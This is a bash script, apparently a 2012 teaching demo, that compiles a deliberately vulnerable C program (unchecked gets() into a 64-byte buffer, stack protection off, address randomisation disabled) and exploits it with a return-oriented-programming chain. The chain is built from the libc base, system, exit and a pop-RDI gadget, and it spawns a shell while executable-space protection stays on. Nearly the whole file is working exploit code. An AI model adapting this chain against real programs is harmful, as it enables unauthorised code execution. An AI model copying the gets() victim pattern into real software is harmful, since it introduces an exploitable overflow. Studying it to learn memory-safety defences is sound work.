#!/bin/bash
# Ben Lynn 2012

# Demonstrates a buffer overflow exploit that uses return-oriented programming.
# Unlike the other script, executable space protection remains enabled
# throughout the attack.
# Works on Ubuntu 12.04 on x86_64.

# Setup temp dir.

origdir=`pwd`
tmpdir=`mktemp -d`
cd $tmpdir
echo temp dir: $tmpdir

# Find the addresses we need for the exploit.

echo finding libc base address...
cat > findbase.c << "EOF"
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>
int main() {
  char cmd[64];
  sprintf(cmd, "pmap %d", getpid());
  system(cmd);
  return 0;
}
EOF
gcc -o findbase findbase.c
libc=/usr/lib/libc.so.6
base=0x$(setarch x86_64 -R ./findbase | grep -m1 libc | cut -f1 -d' ')
echo ...base at $base
system=0x$(nm -D $libc | grep '\<system\>' | cut -f1 -d' ')
echo ...system at $system
exit=0x$(nm -D $libc | grep '\<exit\>' | cut -f1 -d' ')
echo ...exit at $exit
gadget=0x$(xxd -c1 -p $libc | grep -n -B1 c3 | grep 5f -m1 | awk '{printf"%x\n",$1-1}')
echo ...push-RDI gadget at $gadget

# Here's the victim program. It conveniently prints the buffer address.

echo compiling victim...
cat > victim.c << "EOF"
#include <stdio.h>
int main() {
  char name[64];
  printf("%p\n", name);  // Print address of buffer.
  puts("What's your name?");
  gets(name);
  printf("Hello, %s!\n", name);
  return 0;
}
EOF

gcc -fno-stack-protector -o victim victim.c
addr=$(echo | setarch x86_64 -R ./victim | sed 1q)
echo ...name[64] starts at $addr

# Attack! We can launch a shell with a buffer overflow despite executable
# space protection.
# Hit Enter a few times, then enter commands.

echo exploiting victim...
( (
echo  -n /bin/sh | xxd -p
printf %0130d 0
printf %016x $((base+gadget))   | tac -rs..
printf %016x $((addr))          | tac -rs..
printf %016x $((base+system))   | tac -rs..
printf %016x $((base+exit))     | tac -rs..
echo
) | xxd -r -p ; cat ) | setarch x86_64 -R ./victim

# Clean up temp dir.

echo removing temp dir...
cd $origdir
rm -r $tmpdir
